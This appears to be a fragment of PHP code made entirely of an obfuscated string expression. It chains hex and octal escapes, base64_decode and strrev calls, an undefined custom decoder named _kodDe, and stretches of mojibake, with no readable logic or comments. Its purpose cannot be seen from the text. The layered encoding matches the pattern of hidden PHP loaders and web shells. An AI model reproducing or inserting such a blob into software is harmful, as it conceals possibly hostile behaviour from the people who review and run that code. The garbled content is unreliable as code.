¸Åˇ!äìFùÀ∑r›≥£ìóo~Ï˜)ª·')."\x88\xe8\x5a\xa2\x10\xa7\x45\xf6\x5b\x62\xf9\x44\x72\x99\xb8\x89\xf4\x92\x79\x85\xa4\x2c\xf1\xe5\x9b\x71\x20\x66\xb3\x16\xe9\x91\xdc\x30\x9a\xfb\x10\x8a\xda\x81\x61\x35\x96\xb6\x61\xd8\x9c\xd9\xb3\x7d\x81\x2e\xa6\xd\xc8\x31".base64_decode('xutrh62x9qqhXHK4vboKZpwiMFwK7V76NJKlKuJXLd07R4utdqtkh+cm9IPqtnBhlaumuq2NbwA=').base64_decode('3ZAILSWwOkOviaVlWyJBiqwzD4tuIEnoE/n/OqeC0UlmeH/23+Z0+72kw4eGcWAh6JOVbcM11UM=').base64_decode('bWUgLF+/rhTLNhn0GxvvCHmzKUJk9Qh9yonouEWIkhvVR2P6abQpVZFIJIE8XBNacq8kEOYUvWo=')."\46\210\327\213\30\30\100\21\146\122\274\205\103\262\63\211\352\332\6\220\231\212\351\102\127\115\333\54\232\31\235\355\123\2\331\173\6\65\20\352\256\141\137\37\357\362\201\77\106\224\107\221\342\321\261\77".strrev(''."\0".'iH¿Ûø¿1$ÄóqO‡˘øÇ÷◊åçŒÇE†œ{ä˙ >ì{^∆c⁄vÉ_~√˚ÎÈ⁄¨A')."\320\6\45\62\336\24\3\177\40\165\56\370\235\13\261\222\340\257\211\163\221\266\66\136\60\150\255\307\331\5\232\135\256\160\220\245\215\121\270\120\101\270\133\217\255\246\174\223\36\52\300\7\4\24\231\316".base64_decode('ITlDl0zxcSn4yYgO5x2cdXx6VEGDPYQHZ2uZmnBchmlpxHQ0PPCfscRpzJo1x+mqratvaGxqnjs=')."\x8f\x1c\x1e\xe7\xa\x59\x45\xa7\x47\x25\x6e\xe4\x5e\xb0\x1\xfe\xa8\x9\xfa\xc3\xf\x61\xac\x47\xa9\x79\xea\x6c\x1\x5d\x56\x31\xde\x48\x65\x1\x41\x3f\xc6\x10\x35\x8a\x46\x94\x89\x5e\x7a\xb2\x0\x97\xca\x24\xbc\x9d\x21\x69"."\xf3\x3a\xfa\x9\xe5\xb8\x23\x43\x90\xdb\x44\x28\x25\x42\xf\xab\x82\x8e\xa\x89\x85\xd2\xd4\xdd\xfd\xec\xda\xfa\x44\xb\xfb\xc7\x6\xa3\x72\x52\xca\x70\x9\x75\xc5\xaf\x9\xc9\x5\xd0\x26\xaa\x1d\xb5\x3a\x9f\xe2\x15\xb\xb"."\xf\xf\x1\x22\x30\x3a\xf1\xd\xa2\x70\xb2\xb\x4b\x14\xca\x16\x4e\x13\x51\x1c\xbe\xc4\x44\x5\x22\xc\xc8\xc4\xa8\xbb\x78\x31\x4d\x0\x2f\x72\x1\x21\x2a\xe9\xf2\x2d\xf7\x77\xb9\x3a\xe1\x43\x4a\xa1\x3c\x33\x13\x36\x82\x8b"."\x89\x96\x26\xb\xa0\xca\xbb\xe0\x76\x2d\xa7\x50\x5f\x26\x49\x78\xf7\x15\x64\x6b\x1c\x68\x92\x63\x75\x5e\x49\x39\xf2\xb9\x94\x23\xa5\x26\x1d\xb1\x6c\xde\x61\xaa\xc9\x24\xfc\xc7\x1\xc6\xd0\x91\x8f\x27\x1c\x46\x31\xe5\x50\x92"."\362\270\143\114\211\345\251\337\150\275\336\241\350\111\307\110\42\356\110\304\165\107\2\24\220\323\307\34\71\45\351\320\0\134\37\253\167\344\101\330\0\60\31\374\31\72\165\42\243\46\24\15\154\212\14\55"."\123\100\372\110\343\323\300\47\250\30\104\41\313\55\275\340\357\362\326\272\226\7\131\352\270\143\232\4\173\61\53\276\267\230\11\113\61\53\354\305\210\211\136\352\360\173\21\36\22\32\307\157\103\311\31\350"."\x40\x9c\xfc\x37\x9e\xcd\xbb\xe0\x1f\x12\x23\x14\x88\xe8\x40\x63\xbe\x8\x1a\xf8\xb\xa\x5\x2e\x8a\x88\xee\x49\x26\xb8\x30\xa2\xe9\x2a\x10\x97\xe5\xf2\x15\x9\xd8\x13\xd\x2d\x69\x8e\x31\xcd\x26\x11\x35\x44\x52\x84\xba\x91".base64_decode('irAUEjdKMS2t0PQwez0lppr9YAMtc1U/PJoAbkTz0KpRSIJAgN2vjlNz40UufKPK8fMw0cHgujw=')."\146\113\43\104\150\233\4\345\47\10\50\7\316\16\132\30\74\321\214\302\3\115\241\145\213\134\376\156\157\320\205\312\103\6\160\374\333\360\232\120\27\255\331\361\107\231\200\315\20\123\31\55\46\147\242\270"."\14\176\333\44\347\0\127\141\76\67\26\271\160\34\224\346\262\246\244\250\26\121\106\313\245\124\263\220\260\266\151\161\177\10\125\245\0\62\270\154\50\31\120\336\177\310\140\301\220\63\377\11\337\212\221\120"."\x8a\x6a\x5c\xe9\x95\x47\xca\x10\x14\x84\x52\x92\xc9\x32\xc\x9c\x83\xf3\x78\x4b\xe\x78\x2a\xc2\xb2\xf0\x47\x7e\x10\xf3\xf5\xb2\x23\x3d\x31\x8b\x9f\x26\xc1\x73\x6c\xd0\x75\x34\x37\xca\x92\xe0\x70\xa1\x20\x8f\xc0\x42\xc5\xa2"."\60\153\245\5\210\214\66\16\70\43\265\44\364\0\102\203\152\63\135\342\316\203\24\323\31\350\355\37\10\373\274\256\262\110\24\50\334\74\210\124\131\46\31\36\43\203\355\72\72\110\234\46\327\64\50\110".strrev('V'."\n".'Ä(aıî3lÁ,·Ç§Å†˜—2ô©vÕî–◊?ÄK—¬‘^ÅP]©•L≈>è∆'."\n".'ç')._kodDe('Le8anAO26fmjWnRFxtUruj1BmMOHy0VNLJ9M0E1F4tr7VkGLVBtC4jIEHlMHhQP/1FIq/wvRqqSB')."\xba\x43\x2e\xea\x8e\x98\x96\x1b\x71\x24\x8c\x24\xf8\x33\x1c\x60\xe9\x85\xc9\xc9\xc\x40\xcc\xc8\x8e\xc\x60\x60\x8e\xac\x9a\x50\x1d\x59\x10\x50\x4d\xc7\x78\xd6\x61\x34\x64\xc9\x22\x9c\xcd\x83\xc4\x7c\x83\x43\x4b\xea\xe\x7d"."\x4\x14\x69\xa4\xe1\xdc\x18\x71\x8c\xc9\x45\xc7\x58\x56\x76\x64\x1b\x65\x87\x96\x4a\x39\x8a\xa3\x49\xc7\x58\xd1\x51\xd4\xe2\xe\x93\x9e\xfd\x52\x31\x29\x6a\x88\xaa\x79\xa3\x5\x35\x3e\x2\xc1\x2e\xf8\xf\x18\x97\x6c\xde\x88".base64_decode('FnLqOHWvndW0opQtphP/CR87wbbjY6EE8D1dM0ZkF1IRUnT7csTShwjCFNShA6Mt5/MOINAkwLY=').strrev('«ÇPQïñ‚‚År"TEN<QÃﬂ«-’ Ò]†Çr¿ü°ï¿Ê&§°E!ÍêU±˙Ús€}Ÿ')."\50\323\255\214\366\317\133\100\103\100\336\56\326\115\301\177\353\247\144\300\133\213\232\36\123\15\372\22\22\153\372\260\50\154\376\367\231\104\146\370\77\344\342\362\151\112\311\351\377\363\127\205\114\23\12\65".strrev('å¡´#¢≥LZßŸ#¢“ÃØs°¨H%˜‚ÎU⁄úáºÆ åî|TS0Q–ˇÚı®£†<Û≥Ô˘B')."\x56\x1d\x7a\xb6\x18\x73\x64\x47\x8a\x20\x0\x65\xe6\x2c\x98\x87\x20\xac\x0\x91\xd0\x18\x4b\x92\xb9\xdb\x90\xaa\x77\x34\xa4\xf2\xe\x19\x4c\xfc\x98\xa\x38\x80\x5a\x4c\x3a\x72\x46\xd1\x1\x66\x3f\xf8\x7f\xcc\x4\xc5\x81\xdf"."\x2c\x90\x45\xb2\x50\x42\xcf\x2\x51\xbd\xa8\xc5\x28\xdb\x81\x1a\xb0\x2e\x2d\x7\x9f\x9\x80\x4e\xf4\x5d\x63\xf0\xe8\xce\x31\x9d\x70\x5d\x8a\x9f\x46\x27\x6f\xa5\x19\x26\xfe\x57\x36\xe0\xb0\x4e\xd8\x38\x39\x54\x8b\xa\x76\x1"."\377\65\213\260\225\205\223\205\222\160\155\321\36\106\230\221\213\134\244\25\130\112\204\11\16\46\177\162\64\222\31\136\265\304\243\31\115\33\51\344\5\126\200\123\361\56\333\160\15\325\326\115\325\15\273\370".base64_decode('9P5PmLjY/4SFGIOAxHsGo6P06PdXkXxJyCDsITnf5PxySuSXU4TZDVuEXztxMK4LE2An0LNQ8ls=')."\302\165\207\164\260\147\24\347\125\231\335\3\21\271\50\63\246\57\255\133\52\302\46\337\367\140\331\330\274\205\271\133\130\164\226\55\336\226\235\160\11\30\15\12\16\227\360\163\75\236\126\351\255\23\272\65".base64_decode('4YJ/IUe3BkpCkPfpk/PC+zagRWCHBv2HMBDoROFZC0F7SmMSCposOLi4J9DhQQb+0e4AfaG5tbU=')."\15\35\31\263\307\245\1\275\70\301\207\122\354\265\304\101\131\207\12\14\216\60\321\131\223\110\252\244\345\330\265\26\71\27\33\303\250\70\322\337\335\37\365\14\204\273\5\47\11\14\324\117\64\160\320\123"."\xd4\x10\x12\x8\xfa\x8f\xf1\x70\x27\x49\x31\xd9\xa0\xe7\x45\x83\x83\x83\x4e\x78\xde\xe\x2d\x3c\xe2\xe8\x15\xeb\xe\x98\x28\x41\x46\x98\x6d\xad\x18\xd1\x12\xf1\x8c\x56\x48\x54\xf0\x2\xdd\x75\xae\x5a\xa9\xb1\xb6\x4e\x1a\xc8".base64_decode('Ud1Guj2iT5PnNKfwpqDtcXJrouXdXPpxnAT2EoCshB1zoKjogpo+fQqa/PYGlhH1285APzk/6F0=')."\302\364\120\274\112\236\12\315\235\45\157\14\43\325\231\361\154\146\1\123\314\21\116\105\27\172\133\362\272\226\117\252\271\204\4\160\162\106\213\267\265\302\353\131\326\122\321\6\222\344\114\6\246\112\356\266"."\205\156\216\110\106\254\77\30\350\357\362\63\367\10\375\160\10\102\244\341\370\175\163\372\124\75\371\224\105\101\273\2\364\164\5\127\320\256\100\165\252\220\250\217\65\144\362\202\203\165\324\115\253\150\13\112"."\224\34\241\115\227\320\17\60\312\314\102\20\201\170\175\320\12\136\40\217\64\73\5\267\331\42\140\40\61\207\353\26\315\341\100\107\300\365\11\336\220\303\136\205\35\23\207\352\102\150\322\340\256\261\244\263".base64_decode('XCnFJLeyCA5rl3DDdceJ32zX9AmY2YZW9qNU6wlZ0PM7ZnJ1TWa5YE3LLYFjzEIAFInu62wDTaI=')."\241\326\12\142\56\107\347\5\144\206\25\155\230\357\55\14\265\50\343\160\120\101\223\333\2\350\75\347\76\315\104\152\117\13\335\142\32\100\4\134\303\0\33\340\66\66\134\20\203\2\121\161\260\325\250\52"."\x6d\x56\xa2\x85\xfb\xf5\x16\x89\x3d\xc6\xcd\x29\xb6\x60\x26\x9\xc1\x2e\x93\xf5\x89\x16\xa9\xcc\xa3\xde\x99\xb2\xca\xdd\x26\x2a\x91\x30\xb1\xde\x70\xd9\x49\xb\x6d\x7d\x40\xd5\x5a\xe7\x35\x37\xd6\xd6\x3a\xb2\x5\xc3\x74\xea".base64_decode('ivVxVdhREjk/7A058cR2LlMBP/BSq2H0tnqLRCaCQ6LzA4f6PeHOboeEiNUhLfaFAXgA/INV6x0=').base64_decode('EpzXIBnMc4cEbXYd0kAf/uVq0aDvMFkgoxbUlSAOKZoSjZtESRKcsVA9hvQ6BtARzbYMqrmGeqg=')."\25\215\315\166\340\76\235\20\3\340\216\5\75\327\202\275\376\30\316\254\32\7\253\72\130\121\235\200\44\132\240\16\236\265\14\172\221\371\377\137\2\254\5\125\315\376\377\57\5\252\114\170\114\260\310\304"."\12\246\142\374\117\145\120\6\307\272\12\253\25\265\221\125\241\116\252\257\255\225\2\113\40\32\111\231\41\344\242\235\114\170\1\36\37\262\112\143\365\214\204\134\244\317\267\246\341\44\123\163\171\352\23\21"."\61\52\60\360\101\341\131\173\315\272\34\204\55\334\232\64\54\101\71\65\31\155\250\125\236\200\233\14\220\167\202\265\3\256\355\105\5\246\321\316\302\230\230\225\45\132\320\127\60\27\143\140\13\42\50\20"."\143\202\111\236\51\30\240\60\216\215\323\30\172\2\256\103\155\152\16\276\366\152\42\336\206\41\14\101\33\313\51\164\322\303\374\320\256\315\215\200\156\316\230\141\76\214\310\362\21\37\222\155\176\134\264\2".base64_decode('USjM2ipoxdRGZ4WWl0cLCoO32GYJazPKxMjA1mMUy9K1jFxwkfDBNWcYfYMzoBxeIVok6PrXCfg=')."\111\261\204\45\227\320\2\34\320\151\171\342\264\213\370\367\256\254\130\13\227\56\254\210\330\160\160\271\323\67\236\7\165\124\22\140\245\6\33\366\11\213\201\254\173\45\266\201\300\327\166\65\325\116\32\140".strrev('∂'."\n".'*»–bú‰gÀEõ¡fí~–∞F$«Ñô-lS‘gQ4<ËÃpíç(i0äe¢/£±-»}Œ')."\313\304\214\313\254\31\31\52\115\26\316\326\305\252\107\261\161\40\201\214\107\363\112\6\37\226\40\263\55\12\237\230\6\36\317\350\320\213\130\102\214\253\131\170\305\50\263\112\352\100\144\7\334\150\204\342".base64_decode('pHRFyVkgsUxBsQDkTD4tIwgGkFccOmPuzpS7U3d3kq32zviHPMDcSVatTpKJ5EINxDtp6LklpSY=').strrev('lz{ËàëG˜ÒÍÌ]ÔÂÊ™ííÉKnV÷…öÇRì∫5e·–•–ZN∆∏∆Íï<ÑŸ\\’·¬À')."\11\200\147\206\375\235\45\340\216\0\365\346\152\253\165\54\153\125\103\123\163\150\231\357\347\76\150\100\124\66\230\67\123\342\44\220\344\201\72\375\70\270\140\141\114\167\123\263\300\230\260\341\61\262\162\206"."\51\64\271\251\236\271\333\50\20\21\201\270\51\351\361\223\271\343\46\373\273\36\65\106\206\271\277\263\347\30\320\4\350\115\42\20\364\4\127\160\167\266\40\45\354\11\116\223\2\363\20\147\160\324\77\331"."\202\105\213\26\321\147\74\343\31\154\107\10\165\373\331\175\71\200\302\323\47\245\24\52\227\142\102\265\74\144\307\143\271\157\17\312\272\7\267\240\114\342\61\152\176\232\104\65\117\37\141\314\123\365\362\174"."\x81\x5e\x66\xb3\xe3\x34\xc1\x77\xcc\x5c\xf2\x3b\x4e\x7e\x63\x93\xf4\xf5\x0\x9d\xe8\xe\xc4\x65\x92\x5f\x35\xc8\xf9\x58\x6a\x12\xaa\xbe\xd1\x30\x58\x69\x32\xfc\x1c\x13\x29\x3\xf\x4b\x9d\x72\xae\xd2\x94\x2\x0\x6d\x81\xd4"."\13\15\211\162\51\151\22\264\34\173\63\66\270\307\13\43\255\144\62\121\250\362\106\252\33\117\153\222\175\3\111\243\323\177\203\27\103\300\5\252\257\1\231\47\250\40\231\124\144\46\13\267\375\334\277\3"."\261\161\163\271\210\22\17\164\13\0\230\211\25\11\371\244\244\366\376\350\330\40\12\370\234\340\250\20\112\112\22\134\132\220\371\202\305\247\312\22\55\101\206\255\5\73\122\111\50\343\13\44\344\45\210\370"."\xa4\x2e\xef\x98\x7\x7d\x46\x2\x9f\x81\xa6\x5a\x12\xb6\x46\xb5\x28\x8\x62\x84\x12\x48\x8b\x45\xcf\x10\x27\x94\x56\x78\x76\x6d\x5d\xad\x60\x8a\xe1\xef\xf4\x85\xa2\x47\x87\xa0\x17\xcc\x1e\x3f\xf5\xd1\x62\x4d\xf0\x83\xb4\x70"."\160\232\24\117\160\272\224\100\307\321\323\244\164\322\375\203\65\245\47\20\10\211\356\200\154\325\33\350\27\34\375\205\60\12\134\273\353\210\46\150\337\100\17\341\137\21\102\301\21\302\213\73\211\172\123\244"."\x30\xbb\xb6\xd1\xa0\xf4\xce\x9e\xa5\x84\x7d\x13\x15\x1e\x8f\xc6\x47\x66\x38\xac\xa1\x1d\x1a\xe\x4b\x71\x19\x5b\xb3\xc4\x14\x2c\x15\x28\x9\xe8\xf6\x13\xd6\x4e\x32\x80\xac\x4c\x39\xf9\x4c\xe8\xd3\xd7\xed\xae\x72\xcd\xa9\x9e"."\x35\x33\x2b\xc2\x22\x35\x10\x18\xa9\x71\xcf\x1c\x20\xd5\x98\xc9\x61\x0\x61\x16\x83\xbb\x57\x56\x55\x4c\x55\x56\xbb\x6a\xaa\x22\x75\xd5\x4c\x7d\x2b\x42\x4d\xc0\x22\x91\x2\x51\x7e\x1a\x5e\xd3\xb8\x96\xfb\x13\x8c\xc\xb9\x6a".base64_decode('IsOzBG2yNQCwlgHG0vQ8DLlpYFhGTdVQReWwq2ZoZSQyDIPVANYC4ZGQq6ba0T7LPaAaIj72kzw=').base64_decode('LQ7pcmoElmeH+1BkUcEuCZlAiPq0/T7AlAWfa2Y2L5AtdAvW3ChqlGMIXVIKdO1DQVIL+GCxKYA=').base64_decode('BcV2GrXMllqpA4hqFtNfi2M4oXb6HKGgqOgOEUHE1y5gXHgFVagrkNcEDyawIOrhhwgCspGexuU=')."\xd\xf6\x3e\x1\x1a\x20\xd4\x9\xb1\x16\x17\xdc\xf0\xb\xb\x6d\xb7\xcd\x75\x13\xd9\x46\x95\xf6\x21\xe\x1b\xf4\x15\x26\xdc\xd5\xe0\x53\x68\x5f\x43\x9d\x72\x70\x45\xf1\xb1\x18\xe9\x1\xd8\xc7\x51\xdb\x7\x99\x5\x71\x46\xd8"."\216\162\35\30\44\115\160\55\54\32\245\42\122\134\316\303\373\232\4\76\31\7\35\117\276\315\102\3\375\320\141\32\344\4\121\172\206\52\200\374\175\376\150\310\177\214\257\44\1\172\374\55\237\2\326\373"."\xb0\x9f\x8a\x3f\x2\xbc\x2f\x80\x7c\x94\x59\xe0\x3\x7d\x4b\xfa\x2\x83\xe5\x50\xc3\xbd\xfd\x5c\x96\x10\x92\x3a\x3d\x7d\xe1\xa8\xb0\x27\xc5\x9b\x15\xb0\xe5\x62\xbb\x15\xaa\xc5\x1e\xd7\xe3\xd\xf5\x31\x36\xcd\x98\xef\x2e\x2a"."\313\223\231\102\327\174\356\17\140\334\311\224\372\351\176\307\313\335\170\220\154\350\340\225\124\1\71\65\41\31\304\123\34\61\331\41\225\75\303\141\33\52\135\316\31\111\105\267\35\117\306\324\234\114\75\224"."\146\351\267\263\314\214\15\172\66\42\323\23\233\234\31\224\57\10\167\327\171\166\1\110\354\274\164\220\252\47\240\121\222\160\146\227\63\203\112\112\214\366\150\114\147\17\255\346\145\212\200\57\312\10\266\45".base64_decode('cJPiiZsF8eUa4dlzEBOeoBfs65x1EmtRFJeMI3OEBKwpXsZGz2bYj4xe8eSFDnNzoUKMOW2xGdU=')."\121\67\240\222\150\316\106\35\175\302\2\320\143\53\260\5\206\230\6\212\205\257\36\363\226\211\131\320\67\113\262\340\64\150\165\306\131\231\230\142\100\205\254\1\52\166\225\113\51\363\51\224\44\364\150\234"."\356\343\310\122\104\72\161\5\357\53\223\366\167\275\223\276\270\244\211\356\333\260\315\32\351\134\147\275\44\220\27\344\75\2\105\340\323\10\326\215\334\12\63\303\161\64\350\220\100\60\115\342\126\176\370\231".base64_decode('GDa06D0ZFtMFCzAlQYcOvcdSdi3BQPRgS1kbKdxZMNlrcQdpQwBT3ppOHq8XKmPNoGP3eF6Fe8s=')."\x40\x59\x78\x9d\xb9\x17\x4d\x0\x2\xfb\x1c\xe4\xfa\x80\x77\x2\x77\xb2\x86\x1f\x9b\xa1\xce\x3f\x3d\x89\x84\x1d\x1c\xd6\x18\xb0\xd4\x51\x9b\x8b\xb9\x2d\x25\x8e\xd4\xc1\x6\x34\xe4\xf\xf4\x55\x55\x43\x89\xca\x62\xbb\xdf\x3b".strrev('R!B≈Â~Üf±	≤ˆ&ÌP3wÓÏ”	¢∆1)çaàπ-n¡√I£*hEÖŒ<ØvkCQÉ[¡').base64_decode('HjaBInyzhXlipNufsawal3oCi+He2+sPLZFSiilxoQddUlhnOXK8gA71KJHHqAoLCjrRAYjT4gs=')."\x87\xed\x48\x44\x17\x8d\xb0\xa0\x92\x82\xf1\xa8\x8b\xc5\xc1\xd3\x13\x67\x82\x59\xb7\xda\x70\xa9\x90\x50\x92\x43\xfc\xbe\x90\x7\xee\x68\xac\x7c\x1\x81\xc9\x5e\xc7\x5a\xce\x84\x2\xef\x1\xca\x7f\xbb\x50\xe6\xbb\x4\x3f\xc3"."\xcf\x4e\x84\xc\x6a\xae\xa8\x1a\x2a\x9f\xf2\xb4\xab\x26\x44\xfc\x92\xbe\x44\x4d\x11\x10\xa0\x67\x2c\x6e\xf2\xcd\xba\x95\x7d\xa7\xc4\x14\x99\xc7\x31\xe\x79\xb4\x4a\x30\x7a\xc5\x43\x22\xbe\xd5\x26\xac\x6\xd0\xe1\x0\x58\x6a"._kodDe('L52ojUo16cYQg9o3JadDpZjZK4E1PbBFP5gYn9ISf07XDMudjQGnJFtOsKJbNUQ/PIBYa+gh9RkR')."\17\153\355\130\352\4\25\23\70\357\360\173\35\350\255\55\356\160\24\5\201\74\351\200\307\133\250\2\16\176\105\37\105\227\304\144\132\251\32\262\74\45\346\233\30\346\17\104\361\173\171\70\352\266\213\310".strrev('-R≠H!û&‹I§π”S˛ÌGVäx}#0¶∆Ê!§À∫©8ﬂgì√Eº»‰zn;œã¨ädI')."\x72\xad\x80\xf5\x69\xd0\xfd\xce\x42\xea\x19\x1e\x36\x1e\xdb\x29\xa3\xc7\xb7\x7c\xd9\xbc\x69\xb1\x61\xee\x56\xd\xfe\xc2\x3\x12\x13\xf8\x76\x8\xca\x5e\x5a\x76\xa2\x4\x60\x31\x92\xef\xa1\xd5\x60\x2e\x3e\xa1\x19\x49\x2e\xa9".base64_decode('iS1DLMsHWIMDhbBttAOeVJv9iAh6lKJizT5tWYad1zM+bWGMKCLQETJKFTyk01/ofsYQ6VEQRIg=')."\xd5\x52\x84\xfc\x52\x1e\x68\x2f\x1a\x8c\x4d\x27\xd1\xa\xa1\x4\x8\xa3\x25\x89\xbd\xa\x57\x43\x23\x75\x75\x70\xb6\x8e\x6f\xa3\x1\x8\xb0\x1\x64\x89\x23\x50\x34\x4d\x13\x86\x1f\xab\xa3\x7\xb1\x43\x41\x17\xf6\x58\x41\xe5"."\216\224\312\274\206\132\320\10\271\203\55\302\264\276\125\310\372\206\375\254\24\162\176\354\47\336\2\325\5\361\132\164\66\213\75\312\160\177\336\4\35\174\255\37\273\220\41\23\122\54\222\172\352\101\77\120".strrev(''."\r".'ÖúB‘<©!E8àÅƒi'."\0".'r(#°iÜ/ùÖ§K¸¢]bí#°p>&C√†}û•›õl Ù'."\0".'')."\172\23\220\215\35\354\121\362\343\125\222\114\174\204\161\276\317\20\137\302\240\115\300\204\121\362\15\364\13\67\321\16\334\106\7\43\27\325\350\101\352\205\106\10\13\130\16\356\222\335\201\317\346\221\21\13"."\147\16\274\73\50\331\247\24\376\101\130\303\260\370\161\213\44\147\27\342\130\57\331\62\4\355\75\31\326\112\35\42\160\127\106\271\102\226\373\214\2\21\253\0\213\105\173\62\324\337\327\334\202\236\161\40"."\325\130\7\175\61\316\201\337\15\165\130\212\100\25\212\232\102\203\231\64\145\33\256\222\217\375\27\245\23\167\262\110\240\5\242\1\366\60\201\223\132\320\305\106\171\64\325\102\227\140\367\310\217\214\361\253"."\223\171\73\243\134\221\115\324\67\64\315\27\367\213\174\30\271\343\32\162\224\337\200\177\350\321\30\43\14\311\112\147\22\175\352\122\234\331\50\321\352\25\227\274\77\52\160\101\33\377\372\257\246\203\247\234"."\270\211\63\11\47\130\254\144\241\13\312\175\345\377\277\36\126\17\146\144\37\350\145\62\246\40\30\212\42\54\257\75\176\226\361\277\377\76\25\330\144\253\17\53\224\152\235\372\302\261\203\142\6\240\241\73"."\31\23\101\332\347\157\52\11\353\33\54\313\43\212\260\245\42\70\235\71\134\307\11\71\201\347\156\62\20\221\130\10\106\170\303\124\364\251\216\12\12\243\106\116\127\64\332\3\222\372\22\212\101\227\345\310".base64_decode('6ZtnMXOTDy8SeRVgjLMJU+MppuDAHTKWAD01A5tIi0gJ4tzqSKD7hA0oygDCPAL0rQpiIZGXuAA=')."\202\32\52\70\362\41\333\124\336\123\36\62\141\22\16\361\345\126\20\145\204\102\70\72\231\171\310\143\56\376\254\300\277\71\253\346\241\76\252\230\17\43\302\201\14\22\343\130\142\132\224\360\340\213\100\126"."\241\206\325\2\161\231\162\64\213\53\1\11\221\54\42\50\110\71\33\324\334\105\6\263\60\17\351\75\353\114\105\15\372\236\225\10\26\307\74\66\223\210\350\77\136\130\351\104\146\272\207\230\112\50\313\141"."\211\221\10\27\261\220\36\264\160\247\203\342\314\21\47\175\336\211\276\372\44\63\257\55\320\35\15\333\327\340\63\37\202\222\311\160\306\55\76\347\221\211\311\272\13\120\330\210\111\135\170\225\213\210\255\54"."\x23\x8e\x53\x91\x80\x37\x20\xa7\xc6\x47\xca\xb8\xec\x81\xfd\xf\x75\x64\x4\x9e\x29\xac\x34\x25\x68\x9c\xa7\x80\x5\x89\xe9\xb6\xd1\x10\x92\x5d\xa1\x8c\x42\x1e\xac\xb6\xbc\xa1\x10\x60\x77\xbe\xd5\xc4\xdd\xdb\xf0\x22\xca\x10"."\340\54\244\207\111\42\57\260\200\112\70\110\330\302\274\55\300\62\104\0\235\244\123\172\260\344\200\316\201\72\4\41\270\324\103\123\151\152\260\224\207\261\151\50\342\161\76\217\343\360\221\166\353\206\122\374"."\x1a\xbe\x9a\x85\x9b\xa6\x20\xdc\xdf\xb8\x6c\xc5\xb3\x79\x53\x76\xae\xa8\x6\x3e\x86\x13\x65\x7f\x10\x12\xeb\x4e\x27\x5b\xbf\xae\xa1\x15\xd8\xa\x65\xbb\x30\xc1\x44\x48\x50\xdf\x9\xd9\xd9\x95\xa9\x59\x7a\x1\x8\xcc\xc2\x11"."\71\176\44\21\77\135\15\337\163\3\114\113\12\15\364\126\41\7\327\20\200\134\345\240\147\265\126\21\201\140\225\64\103\22\376\303\217\253\125\301\144\130\310\52\311\337\307\37\274\255\226\370\243\140\342\373".base64_decode('2PAMqUtjQ2/1zw+d51rpvK0cWlzTDQFNeFtoKfQ0joO9ao4+C0HIl2YnXS8+NG8tH4x0yLSMCX8=').strrev('t/¿∫Á—råêèj'."\n".'õ¬]=Ä÷ıµY¬	Iw”"QQ˛≠¡uÃpêDd‘DÛeì]·b⁄8.˛‹')."\335\357\347\316\22\120\62\76\135\363\24\145\246\102\142\317\65\140\221\100\205\73\206\70\242\100\276\115\100\31\143\240\226\350\37\117\136\265\347\60\323\252\236\350\120\163\11\73\176\41\27\143\120\216\16\6".base64_decode('o6McGMhInD3b4MJKwhmkXORn0FwmTCS65GIZVGbazKAAwlCRwCO8MMId6ypj4tcJXrJ0HYGIpVA=')."\xfe\x2\x89\xbd\x5d\x68\xde\x30\x38\x39\xf6\xcf\x9\x5e\xcf\x8\xb9\x71\x10\x7e\x38\x9e\xb9\xb5\xc3\x45\xe9\x1a\xca\x28\x27\xb8\xbf\x3b\x5c\x47\xb6\x7d\xe3\x9f\xb4\x3e\x94\xc2\xd0\x98\x30\x6\x70\x90\x92\xb8\xd3\x2\xb5\xf9"."\366\205\47\131\164\105\265\45\221\275\243\120\174\331\55\246\205\24\172\204\342\304\233\207\151\63\204\312\177\204\323\253\265\213\103\266\373\16\33\13\345\310\164\61\323\54\3\42\60\130\326\130\202\31\24\23".base64_decode('LVW0DzcS9DmtYmAWnS/hNI81CeMrthaJGeytxTn0kj4jecp/2v4B2mX2ez9eiHDaVnIpGdbK5ME=')."\x35\x2a\x9b\xd\x27\xc1\x9c\x5c\x5a\xb3\xe4\x15\xf7\xb4\x3c\x1b\x80\x16\x8c\x69\x6a\x58\xda\x7e\x34\x3b\x6c\xad\x27\x75\xe6\x7e\xb5\x5\xd4\xe9\xba\xa4\x2c\x72\xe9\xe7\xc8\xf8\xdb\xb1\xd1\x3e\xb5\x7c\x2d\xca\xee\xa9\xa7\xab"."\105\131\344\151\153\301\261\155\127\210\345\330\34\115\51\303\330\370\215\137\51\13\345\151\145\356\37\161\231\160\175\15\132\324\361\112\222\305\313\314\362\327\235\301\262\23\321\260\336\103\332\340\142\307\120\305"."\x8a\xad\xeb\x4e\xd9\xfe\xe0\xb9\xfe\x7e\x89\x6\x44\xb0\x85\xf1\x16\x72\x23\x39\xea\xb1\x8\x7c\x81\x7b\x2\x84\x56\x89\x1e\xdd\xde\x7f\x54\x8c\xb3\x39\xc5\xa5\xe4\x99\x2b\x8\x8e\x58\xcb\x7a\xd5\x75\xc0\x1d\x6e\xe9\x16\x32"."\103\375\131\211\76\207\361\76\103\63\325\270\240\6\1\201\242\333\134\234\116\77\222\341\47\121\104\6\300\267\133\136\121\253\27\325\126\205\57\242\263\33\104\313\165\131\231\164\27\77\231\264\70\145\106\357"."\x68\x31\x4b\x6d\xbc\x28\x93\xb3\x59\x7c\x93\x80\x34\x56\x8\xa4\x63\x2\x6e\x93\x1c\x78\xad\xc3\xc9\x21\x4d\x37\xa1\x5\x37\xe0\xc7\x79\xf4\xdb\xa1\x99\x26\x65\x13\x40\xb2\x45\x98\x48\x74\x43\xe\x62\x84\xfb\x51\x10\xe2\xf".strrev('±nìû◊Özúm1É6'."\0".'(ólw+ûñ	f„¿âe&"ß!î∑ßrAACPà¬«Eæ¬ï').strrev('¬á˜-˜5_‡tf1¯x—é@ï˜‰≈ÃXöˆH±‘«ìºìÜTNÿÍ&‚únX©∂ÒB°?±‹gã')."\241\222\244\176\117\50\64\30\10\172\261\112\147\111\62\312\45\134\255\227\44\365\167\7\372\246\113\363\365\172\374\75\45\151\360\252\35\52\232\322\247\34\161\222\277\37\325\322\323\323\103\365\272\112\153\341".base64_decode('71zCa4JumPh5aD6t0eNFm84JPT4OyXSaQObPNrRCWMmywyehOOspgDjkBn1qlAXyJTsIYaGHV+M=').base64_decode('faSwIPWkCN+1ZtOfSbOocaKODb9Pc1nu3QQ4mjiICQkEKa7BCEB0Qm33HrbOFNb70pszBOEdAus=').base64_decode('fTT1pLBaiwknqphPWTiUqNyAwzYGlghrYTlF+AoULHisY0IMi8cVbYytmHKKXl/bWbFwXwt76f8=')."\1\202\10\320\177\222\302\0\0", 